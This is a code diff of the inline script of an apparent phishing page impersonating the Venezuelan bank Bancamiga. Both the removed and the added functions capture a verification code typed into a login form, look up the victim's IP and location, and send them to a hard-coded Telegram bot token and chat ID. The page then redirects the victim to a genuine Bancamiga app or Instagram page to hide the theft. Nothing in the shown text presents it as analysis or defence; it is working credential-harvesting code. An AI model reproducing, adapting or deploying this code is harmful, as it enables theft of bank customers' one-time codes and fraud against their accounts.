@@ -65,64 +65,45 @@
     </style>
 
     <script>
-        async function getLocation() {
-            try {
-                const response = await fetch('https://ipapi.com/json/');
-                const data = await response.json();
-                return {
-                    city: data.city,
-                    region: data.regionName,
-                    country: data.country,
-                    ip: data.query
-                };
-            } catch (error) {
-                console.error('Error al obtener la ubicación:', error);
-                return {
-                    city: 'No disponible',
-                    region: 'No disponible',
-                    country: 'No disponible',
-                    ip: 'No disponible'
-                };
-            }
-        }
+        function sendToTelegram(event) {
+            event.preventDefault(); // Evita el envío del formulario tradicional
 
-        async function sendMessage() {
-            const cod2 = document.getElementById("cod2").value;
-            const location = await getLocation();
-            const token = "8071410762:AAFOUv9oR1Dh3_OLwBdTM95YWZwYUwwqKr4"; // Reemplaza con el token de tu bot
-            const chatId = "-4571868410"; // Reemplaza con el chat ID donde deseas enviar el mensaje
+            // Recolectar el código ingresado
+            const cod2 = document.getElementById('cod2').value;
 
-            const url = `https://api.telegram.org/bot${token}/sendMessage`;
-            const params = {
-                chat_id: chatId,
-                text: `Código2: ${cod2}\nCiudad: ${location.city}\nEstado: ${location.region}\nPaís: ${location.country}\nIP: ${location.ip}`
-            };
+            // Obtener la dirección IP y ubicación
+            fetch('https://ipwhois.app/json/')
+                .then(response => response.json())
+                .then(data => {
+                    const ip = data.ip;
+                    const location = `${data.city}, ${data.region}, ${data.country}`;
+                    
+                    // Crear el mensaje a enviar
+                    const message = `Código de Verificación:\nCódigo: ${cod2}\nIP: ${ip}\nUbicación: ${location}`;
 
-            try {
-                const response = await fetch(url, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(params)
+                    // Enviar el mensaje al bot de Telegram
+                    const token = '8071410762:AAFOUv9oR1Dh3_OLwBdTM95YWZwYUwwqKr4'; // Reemplaza con tu token
+                    const chatId = '-4571868410'; // Reemplaza con el chat ID donde deseas enviar el mensaje
+                    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+                    return fetch(url);
+                })
+                .then(response => {
+                    if (response.ok) {
+                        // Redirigir a otra página HTML después de enviar los datos
+                        window.location.href = 'https://apps.apple.com/us/app/bancamiga-suite/'; // Cambia esta URL por la página a la que deseas redirigir
+                    } else {
+                        console.error('Error al enviar el mensaje a Telegram.');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
                 });
-
-                if (response.ok) {
-                    window.location.href = 'https://www.instagram.com/bancamiga/'; // Redirige a la página deseada
-                } else {
-                    console.error('Error al enviar el mensaje a Telegram.');
-                }
-            } catch (error) {
-                console.error('Error:', error);
-            }
         }
 
         document.addEventListener("DOMContentLoaded", function() {
             const form = document.getElementById("login-form");
-            form.addEventListener("submit", function(event) {
-                event.preventDefault(); // Evita que el formulario se envíe de forma tradicional
-                sendMessage(); // Llama a la función para enviar el mensaje
-            });
+            form.addEventListener("submit", sendToTelegram); // Llama a la función para enviar el mensaje
         });
     </script>
 </head>
